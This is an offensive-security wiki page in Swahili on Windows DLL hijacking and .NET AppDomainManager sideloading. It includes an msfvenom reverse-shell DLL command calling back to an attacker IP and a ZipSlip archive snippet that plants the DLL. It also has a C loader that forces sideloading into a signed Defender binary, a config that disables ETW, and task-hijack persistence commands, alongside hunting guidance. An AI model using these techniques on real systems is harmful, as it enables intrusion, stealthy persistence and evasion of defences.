# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kudanganya programu inayoaminika ili ipakie DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, na Side-Loading**. Hutumika zaidi kutekeleza msimbo na kudumisha uwepo, na mara chache zaidi, kuongeza ruhusa. Ingawa hapa tunalenga kuongeza ruhusa, mbinu ya hijacking hubaki ileile bila kujali lengo.

### Mbinu za Kawaida

Kuna mbinu kadhaa za DLL hijacking, na ufanisi wa kila moja hutegemea mkakati wa programu wa kupakia DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Kubadilisha DLL halisi na DLL hasidi, kwa hiari kutumia DLL Proxying ili kuhifadhi utendakazi wa DLL asilia.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi kwenye njia ya utafutaji iliyo mbele ya ile halali, kwa kutumia mpangilio wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo programu itapakia ikidhani ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kurekebisha vigezo vya utafutaji kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza programu kwenye DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na DLL hasidi kwenye saraka ya WinSxS; mbinu hii mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi kwenye saraka inayodhibitiwa na mtumiaji pamoja na programu iliyonakiliwa, sawa na mbinu za Binary Proxy Execution.

Programu inaweza pia kutekeleza **kipakiaji chake cha DLL**. Mchakato wenye ruhusa za juu unaweza kuorodhesha saraka ndogo kama `Libraries` au `Plugins` na kupitisha DLL iliyochaguliwa kwa programu saidizi, bila kutegemea mpangilio wa kawaida wa utafutaji wa DLL wa Windows. Ikiwa akaunti nyingine inaweza kuunda faili kwenye saraka hiyo hasa, lichukulie kama jambo la kuchunguza: thibitisha utambulisho wa mchakato, ACL inayotumika kwenye saraka, kanuni ya kuchagua faili, na uwezekano wa kufikia operesheni ya kupakia. Saraka inayoweza kuandikika iliyo karibu na faili ya executable haithibitishi kuwa mchakato hupakia DLL kutoka humo.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### PE import grafting baada ya usakinishaji

Side-loading ya kawaida huacha PE inayoaminika bila mabadiliko na hushinda katika utatuzi wa majina ya DLL. Kinyume chake, **Import grafting** hurekebisha PE ambayo tayari inapakiwa na programu inayoaminika. Mshambuliaji huongeza import descriptor pamoja na maingizo yanayohusiana ya lookup/IAT kwa DLL inayodhibitiwa na mshambuliaji. Windows inapotatua utegemezi huo kwa mfululizo, hupakia DLL iliyoongezwa na kuendesha msimbo wake wa uanzishaji ndani ya mchakato unaoonekana kuwa halali. Huu ni urekebishaji wa PE iliyo kwenye diski, si sawa na kubadilisha runtime hook ya function pointer ya IAT iliyo hai.<sup>[[31]](#references)[[32]](#references)</sup>

PE iliyorekebishwa inaweza kuwa DLL ya kati ya vendor badala ya executable inayoendeshwa na mtumiaji au Task Scheduler. Mlolongo unaoweza kutumika tena ni:<sup>[[32]](#references)</sup>

1. Nakili executable halali pamoja na vitegemezi vyake kwenye saraka inayodhibitiwa na mshambuliaji.
2. Rekebisha miundo ya import ya utegemezi mmoja ili irejelee DLL hasidi, huku ukihifadhi exports zinazotarajiwa na tabia ya kawaida ya utegemezi huo.
3. Sanidi autorun au scheduled task ili ianzishe executable halali. Loader hupakia utegemezi uliobadilishwa kisha DLL iliyoingizwa upya. Tazama [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) kwa kuorodhesha tasks.
4. Epuka kuweka kazi nzito ndani ya `DllMain`; loader iliyoonekana iliunda worker thread na kuendelea na decryption iliyopangwa hatua kwa hatua humo.

Hii ni tofauti na uvamizi wa supply chain upande wa vendor, kwa kuwa kifurushi cha vendor hakina mabadiliko na import hurekebishwa baada ya usakinishaji. Chunguza kila module kwenye saraka iliyotayarishwa, si host EXE pekee: linganisha orodha za import na hashes za vitegemezi na usakinishaji unaojulikana kuwa safi, thibitisha signatures, na chunguza binaries za vendor zinazoendeshwa kutoka maeneo ya kuandikika yasiyo ya kawaida kama `C:\ProgramData`. Scheduled task inayoelekeza kwenye crash reporter au updater iliyonakiliwa kwenye saraka kama hiyo ni sehemu muhimu ya kuanzia uchunguzi.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading si njia pekee ya kufanya mchakato wa **.NET Framework** unaoaminika upakie msimbo wa mshambuliaji. Ikiwa executable lengwa ni programu ya **managed**, CLR pia hukagua **faili ya usanidi wa programu** yenye jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa usanidi unaelekeza kwenye assembly inayodhibitiwa na mshambuliaji na iliyowekwa karibu na EXE, CLR huipakia **kabla ya njia ya kawaida ya msimbo wa programu** na kuiendesha ndani ya mchakato unaoaminika.<sup>[[24]](#references)</sup>

Kulingana na schema ya usanidi ya .NET Framework ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` lazima zote ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>

Usanidi wa chini kabisa:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Msimamizi wa kiwango cha chini:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Vidokezo vya vitendo:
- Hii ni tradecraft **maalum kwa .NET Framework**. Inategemea uchanganuzi wa usanidi wa CLR, si mpangilio wa utafutaji wa Win32 DLL.
- Host lazima iwe **managed EXE** kweli. Ukaguzi wa haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** kwenye metadata ya PE.
- Jina la faili la usanidi lazima lilingane kabisa na jina la executable (`<binary>.config`), na kwa kawaida huwa **karibu na EXE**.
- Hii ni muhimu kwa **binaries zilizosainiwa za Microsoft/vendor** kwa sababu EXE inayoaminika hubaki bila kuguswa huku assembly hasidi ya managed ikitekelezwa ndani ya mchakato huo.
- Ikiwa tayari una directory ya installer/update inayoweza kuandikika, AppDomainManager hijacking inaweza kutumika kama **hatua ya kwanza**, ikifuatiwa na DLL sideloading ya kawaida au reflective loading kwa hatua zinazofuata.

### AppDomainManager kama downloader + bootstrap ya scheduled-task

Muundo wa vitendo wa uvamizi ni kuoanisha EXE ya managed inayoaminika na `*.config` hasidi pamoja na AppDomainManager DLL hasidi inayofanya kazi kama **bootstrapper ndogo** tu:<sup>[[25]](#references)</sup>

1. Mtumiaji anazindua installer au updater ya .NET iliyosainiwa kutoka eneo linaloaminika, kama `%USERPROFILE%\Downloads`.
2. Config iliyo karibu husababisha CLR kupakia assembly ya mshambuliaji **kabla** mantiki halali ya programu haijaanza.
3. Manager hasidi hutekeleza **path gate** (kwa mfano, kuendelea tu ikiwa host EXE inaendeshwa kutoka `Downloads`, na kuruhusu hatua ya pili iendeshwe kutoka `%LOCALAPPDATA%` pekee).
4. Ikiwa ukaguzi umefaulu, hupakua payload halisi kwenye njia inayoweza kuandikika na mtumiaji, kama `%LOCALAPPDATA%\PerfWatson2.exe`, na kuweka persistence kwa scheduled task.

Kwa nini mbinu hii ni muhimu:
- Host EXE iliyosainiwa hubaki bila kubadilishwa, kwa hiyo ukaguzi wa triage unaohash main binary pekee unaweza kukosa uvamizi.
- **Path-based anti-analysis** rahisi ni ya kawaida: kuhamisha jozi ya ZIP/EXE/DLL hadi Desktop, Temp, au njia ya sandbox kunaweza kuvunja mnyororo kimakusudi.
- AppDomainManager DLL ya hatua ya kwanza inaweza kubaki ndogo na isiyoonekana sana huku implant halisi ikipakuliwa baadaye.

Mfano mdogo wa persistence unaoonekana mara nyingi katika muundo huu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Maelezo:
- ` /rl highest` humaanisha **kiwango cha juu zaidi kinachopatikana** kwa mtumiaji/session hiyo; hakihakikishi SYSTEM escalation chenyewe.
- Mbinu hii mara nyingi huainishwa vizuri zaidi kama **utekelezaji/udumishaji kupitia matumizi mabaya ya usanidi wa .NET** kuliko classic missing-DLL search-order hijacking, ingawa operators mara nyingi huunganisha mbinu zote mbili.

Viashiria vya ugunduzi:
- Executables za .NET zilizotiwa saini zinazoanzishwa kutoka **njia za uchimbuaji wa ZIP**, `Downloads`, `%TEMP%`, au folda nyingine zinazoweza kuandikwa na mtumiaji, zikiwa na faili ya `<exe>.config` **iliyowekwa pamoja nazo**.
- Scheduled tasks mpya ambazo action yake inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au `Downloads`, na majina yake yanafanana na yale ya browser/vendor updaters.
- Michakato ya bootstrap inayotumia managed code na kuisha haraka; huanza kwa kupakua EXE nyingine, kisha huzindua `schtasks.exe`.
- Samples zinazoisha mapema isipokuwa njia ya executable ilingane na saraka inayotarajiwa ndani ya user profile.

### Hijacking ya scheduled task iliyopo ili kuzindua upya mnyororo wa sideload

Kwa persistence, usitafute tu **uundaji wa task mpya**. Baadhi ya makundi ya uvamizi husubiri hadi installer halali iunde **task ya kawaida ya updater**, kisha **hubadilisha action ya task** ili jina, mwandishi na trigger zilizopo zibaki zinafahamika kwa defenders.

Mtiririko wa kazi unaoweza kutumika tena:
1. Sakinisha/endesha programu halali na utambue task ambayo kawaida huunda.
2. Export task XML na uandike thamani za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Badilisha action pekee ili task ianzishe **host EXE unayoamini** kutoka kwenye saraka ya staging inayoweza kuandikwa na mtumiaji; kisha EXE hiyo hu-side-load au kupakia payload halisi kupitia AppDomain.
4. Sajili tena task kwa jina hilohilo badala ya kuunda persistence artifact mpya iliyo wazi.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Kwa nini ni fiche zaidi:
- Jina la task bado linaweza kuonekana halali (kwa mfano, updater ya vendor).
- Huduma ya **Task Scheduler** ndiyo inayoiendesha, kwa hivyo ukaguzi wa parent/ancestor mara nyingi huona mnyororo wa kawaida wa scheduling badala ya `explorer.exe`.
- Timu za DFIR zinazotafuta **majina mapya ya task pekee** zinaweza kukosa task ambayo usajili wake ulikuwepo tayari, lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au njia nyingine inayodhibitiwa na mshambulizi.

Njia za haraka za hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha XML za `C:\Windows\System32\Tasks\*` na metadata ya `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` na baseline.
- Toa alert wakati **task ya updater inayoonekana kuwa ya vendor** inaendesha kutoka **directories zinazoweza kuandikwa na mtumiaji** au inapozindua .NET EXE yenye faili ya `*.config` iliyo kwenye directory hiyo hiyo.

> [!TIP]
> Kwa mnyororo wa hatua kwa hatua unaoweka HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, pitia workflow iliyo hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kutafuta DLL zilizokosekana

Njia ya kawaida zaidi ya kutafuta DLL zilizokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kwa kuweka** **filters 2 zifuatazo**:

![Common Techniques - Finding missing Dlls: Njia ya kawaida zaidi ya kutafuta DLL zilizokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, kwa kuweka filters 2 zifuatazo](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Njia ya kawaida zaidi ya kutafuta DLL zilizokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, kwa kuweka filters 2 zifuatazo](<../../../images/image (230).png>)

na uonyeshe tu **File System Activity**:

![Common Techniques - Finding missing Dlls: na uonyeshe tu File System Activity](<../../../images/image (153).png>)

Ikiwa unatafuta **DLL zilizokosekana kwa ujumla**, **iache** ikiendelea kwa **sekunde** kadhaa.\
Ikiwa unatafuta **DLL iliyokosekana ndani ya executable maalum**, weka filter nyingine kama **"Process Name" "contains" `<exec name>`**, iendeshe, kisha usimamishe kunasa events.<sup>[[9]](#references)</sup>

## Kutumia DLL Zilizokosekana

Ili kupandisha privileges, tafuta **DLL ambayo process yenye privileges inajaribu kuipakia** kutoka eneo unaloweza kuandikia. Hili linaweza kutokea unapodhibiti directory inayotafutwa kabla ya directory iliyo na DLL halali, au wakati DLL iliyoombwa haipo na unaweza kuandika kwenye mojawapo ya directories zinazotafutwa.

### Mpangilio wa Utafutaji wa DLL

**Ndani ya** [**nyaraka za Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata maelezo kuhusu jinsi DLL zinavyopakiwa.**

**Windows applications** hutafuta DLL kwa kufuata seti ya **njia za utafutaji zilizoainishwa mapema**, kwa mfuatano maalum. Tatizo la DLL hijacking hutokea wakati DLL hasidi inapowekwa kimkakati kwenye mojawapo ya directories hizi, ili ipakuliwe kabla ya DLL halisi. Njia moja ya kuzuia hili ni kuhakikisha application inatumia absolute paths inaporejelea DLL inazohitaji.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit** hapa chini:

1. Directory ambayo application ilipakiwa kutoka humo.
2. System directory. Tumia function ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata path ya directory hii.(_C:\Windows\System32_)
3. System directory ya 16-bit. Hakuna function inayopata path ya directory hii, lakini inatafutwa. (_C:\Windows\System_)
4. Windows directory. Tumia function ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata path ya directory hii.
   1. (_C:\Windows_)
5. Directory ya sasa.
6. Directories zilizoorodheshwa kwenye environment variable ya PATH. Kumbuka kuwa hii haijumuishi path ya kila application iliyoainishwa na registry key ya **App Paths**. Key ya **App Paths** haitumiki wakati wa kukokotoa path ya utafutaji wa DLL.

Huu ndio mpangilio wa utafutaji wa **chaguo-msingi** wakati **SafeDllSearchMode** imewezeshwa. Ikiwa imezimwa, directory ya sasa hupanda hadi nafasi ya pili. Ili kuzima kipengele hiki, unda registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (chaguo-msingi ni imewezeshwa).

Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) itaitwa pamoja na **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji huanza kwenye directory ya executable module ambayo **LoadLibraryEx** inapakia.

Hatimaye, DLL inaweza kupakiwa kwa kutumia absolute path badala ya jina. Katika hali hiyo, Windows hutafuta DLL yenyewe kwenye path hiyo pekee; dependencies zinazoombwa kwa jina bado hufuata mpangilio wa utafutaji unaotumika.

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji, lakini sitazieleza hapa.

### Kuunganisha uandishi holela wa faili na utekaji wa DLL iliyokosekana

**Mbinu inayohusiana:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Tumia filters za **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambazo process inajaribu kutafuta lakini haiwezi kuzipata.<sup>[[14]](#references)</sup>
2. Ikiwa binary inaendeshwa kwa **ratiba/kama huduma**, kuweka DLL yenye mojawapo ya majina hayo kwenye **application directory** (nafasi ya #1 kwenye mpangilio wa utafutaji) kutaisababisha ipakuliwe itakapoendeshwa tena. Katika hali moja ya .NET scanner, process ilitafuta `hostfxr.dll` ndani ya `C:\samples\app\` kabla ya kupakia nakala halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (kwa mfano, reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni **uandishi holela wa faili wa mtindo wa ZipSlip**, tengeneza ZIP ambayo entry yake inatoka nje ya extraction dir ili DLL iwekwe kwenye app folder:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Peleka archive kwenye inbox/share inayofuatiliwa; task iliyoratibiwa itakapoanzisha upya process, itapakia DLL hasidi na kutekeleza code yako kama service account.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya kina ya kudhibiti kwa uhakika DLL search path ya process mpya ni kuweka field ya DllPath katika RTL_USER_PROCESS_PARAMETERS unapounda process kwa kutumia native APIs za ntdll. Ukitoa directory inayodhibitiwa na mshambuliaji hapa, process lengwa inayotafuta DLL iliyoingizwa kwa jina (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia DLL hasidi kutoka directory hiyo.

Wazo kuu
- Unda process parameters kwa RtlCreateProcessParametersEx na utoe DllPath maalum inayoelekeza kwenye folder unalodhibiti (kwa mfano, directory ambako dropper/unpacker yako ipo).
- Unda process kwa RtlCreateUserProcess. Binary lengwa inapotafuta DLL kwa jina, loader itaangalia DllPath hii iliyotolewa wakati wa kutafuta, na hivyo kuwezesha sideloading ya kuaminika hata kama DLL hasidi haipo pamoja na target EXE.

Maelezo/mipaka
- Hili huathiri child process inayoundwa; ni tofauti na SetDllDirectory, inayoathiri process ya sasa pekee.
- Target lazima i-import au iite LoadLibrary kwa DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zilizowekwa moja kwa moja haziwezi kutekwa. Forwarded exports na SxS zinaweza kubadilisha mpangilio wa kipaumbele.

Mfano mdogo wa C (ntdll, wide strings, ushughulikiaji wa makosa uliorahisishwa):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll hasidi (inayosafirisha functions zinazohitajika au kupeleka maombi kwa ile halisi) kwenye directory yako ya DllPath.
- Zindua binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu iliyo hapo juu. Loader hutatua import kupitia DllPath iliyotolewa na kufanya sideload ya DLL yako.

Mbinu hii imeonekana ikitumika porini kuendesha minyororo ya sideloading ya hatua nyingi: launcher ya awali huweka helper DLL, ambayo kisha huzindua binary iliyosainiwa na Microsoft na inayoweza kufanyiwa hijack, ikiwa na DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwenye staging directory.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking ya .NET kupitia `.exe.config`

Kwa malengo ya **.NET Framework**, sideloading inaweza kufanywa **kabla ya `Main()`** bila kurekebisha memory kwa kutumia vibaya faili ya **`.exe.config`** iliyo karibu na programu. Badala ya kutegemea tu mpangilio wa utafutaji wa Win32 DLL, mshambuliaji huweka EXE halali ya .NET karibu na config hasidi na assembly moja au zaidi zinazodhibitiwa na mshambuliaji.

Jinsi mnyororo unavyofanya kazi:<sup>[[15]](#references)[[22]](#references)</sup>
1. EXE mwenyeji huanza na **CLR husoma `<exe>.config`**.
2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime ianzishe `AppDomainManager` inayodhibitiwa na mshambuliaji.
3. Manager hasidi hupata **utekelezaji kabla ya `Main()`** ndani ya mchakato wa mwenyeji unaoaminika.
4. Config hiyo hiyo inaweza kulazimisha CLR kutatua assembly za ndani kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na inaweza kudhoofisha uthibitishaji/telemetry ya runtime bila inline patching.

Muundo wa aina ya kampeni (mpangilio halisi wa ndani unaweza kutofautiana kulingana na directive / toleo la CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Kwa nini hili lina manufaa:
- **`<probing privatePath="."/>`** huweka utatuzi wa assembly kwenye saraka ya programu, na kugeuza folda hiyo kuwa eneo linalotabirika la sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamishia utekelezaji kwenye msimbo wa mshambuliaji wakati wa uanzishaji wa CLR, kabla mantiki halali ya programu haijaanza.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu programu ya full-trust kupakia assembly zisizosainiwa au zilizobadilishwa bila kushindwa kwa uthibitishaji wa strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** huepusha uelekezaji upya wa publisher-policy kwenda kwenye assembly mpya zaidi.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hufanya uteuzi wa runtime uweze kutabirika zaidi.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** inavutia hasa kwa sababu **CLR huzima mwonekano wake yenyewe wa ETW** kupitia usanidi, badala ya implant kubadilisha `EtwEventWrite` kwenye kumbukumbu.

Muundo wa kiutendaji ulioonekana kwenye kampeni za hivi karibuni:
- Hatua ya 1 hudondosha `setup.exe`, `setup.exe.config`, na assembly za ndani.
- Hatua ya 2 huzinakili kwenye folda inayosadikisha ya **AppData update**, hubadilisha jina la host kuwa kitu kama `update.exe`, kisha huiwasha tena kupitia **scheduled task**.
- Hatua ya 3 hukagua muktadha wa utekelezaji (kwa mfano, inatarajia parent kuwa `svchost.exe` kutoka Task Scheduler) kabla ya kupakia RAT DLL/export ya mwisho.

Mawazo ya kutafuta:
- **.NET executables** zilizotiwa saini au zilizo halali kwa namna nyingine, zinazoendeshwa zikiwa na faili za **`.config`** zinazotia shaka karibu nazo, katika maeneo yanayoweza kuandikiwa na watumiaji.
- Faili za `.config` zilizo na **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazoanzisha tena binaries za update zilizobadilishwa majina kutoka **`%LOCALAPPDATA%`** au saraka za programu mahususi za `\bin\update\`.
- Minyororo ya parent/child ambapo scheduled task huwasha host ya .NET inayoaminika, ambayo mara moja hupakia assembly zisizotoka kwa mtengenezaji kutoka kwenye saraka yake yenyewe.

#### Vighairi vya mpangilio wa utafutaji wa dll katika nyaraka za Windows

Baadhi ya vighairi vya mpangilio wa kawaida wa utafutaji wa DLL vimebainishwa kwenye nyaraka za Windows:

- Mfumo unapokutana na **DLL yenye jina sawa na ile ambayo tayari imepakiwa kwenye kumbukumbu**, huruka utafutaji wa kawaida. Badala yake, hukagua uelekezaji upya na manifest kabla ya kutumia DLL ambayo tayari iko kwenye kumbukumbu. **Katika hali hii, mfumo hautafuti DLL**.
- DLL inapotambuliwa kuwa **known DLL** kwa toleo la sasa la Windows, mfumo hutumia toleo lake la known DLL pamoja na DLL zake zote tegemezi, **bila kufanya utafutaji**. Ufunguo wa registry **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** huhifadhi orodha ya known DLL hizi.
- Ikiwa **DLL ina dependencies**, utafutaji wa DLL hizo tegemezi hufanywa kana kwamba zimetajwa kwa **majina ya module** pekee, bila kujali kama DLL ya awali ilitambuliwa kupitia full path.

### Kupandisha Haki

**Mahitaji**:

- Tambua mchakato unaoendeshwa au utakaoendeshwa chini ya **haki tofauti** (usogezaji wa mlalo au wa pembeni), ambao **unakosa DLL**.
- Hakikisha **ruhusa ya kuandika** inapatikana kwa **saraka** yoyote ambamo **DLL** itatafutwa. Eneo hili linaweza kuwa saraka ya executable au saraka iliyo ndani ya system path.

Masharti haya si ya kawaida kwa chaguomsingi: executable zenye haki za juu kwa kawaida hazikosi dependencies za DLL, na watumiaji wa kawaida kwa kawaida hawawezi kuandika kwenye saraka za system search-path. Hata hivyo, mazingira yaliyosanidiwa vibaya yanaweza kufichua hali zote mbili.\
Ikiwa mahitaji yametimizwa, angalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Ingawa lengo lake kuu ni UAC bypass, una PoCs za DLL-hijacking za matoleo mahususi ya Windows ambazo mara nyingi zinaweza kurekebishwa ili zitumie saraka inayoweza kuandikwa uliyoipata.

Kumbuka kuwa unaweza **kuangalia ruhusa zako kwenye folda** kwa kufanya:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Na **kagua ruhusa za folda zote ndani ya PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Unaweza pia kuangalia imports za executable na exports za dll kwa kutumia:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Kwa mwongozo kamili wa jinsi ya **kutumia vibaya DLL Hijacking ili kuongeza mapendeleo** ukiwa na ruhusa za kuandika kwenye folda ya **System Path**, angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia kama una ruhusa za kuandika kwenye folda yoyote iliyo ndani ya system PATH.\
